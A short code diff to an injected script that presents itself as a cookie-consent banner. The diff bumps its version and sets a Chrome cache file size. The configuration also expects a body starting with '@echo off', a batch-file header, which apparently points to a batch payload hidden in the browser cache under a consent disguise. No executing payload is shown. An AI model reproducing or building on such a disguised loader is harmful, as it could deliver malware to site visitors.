@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.14',
+    version: '1.9.15',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -26,7 +26,7 @@
     bodyMustStartWith: '@echo off',
     cacheFileSizes: {
       firefox: 0,
-      chrome: 0,
+      chrome: 17189,
       edge: 0,
       brave: 0
     },
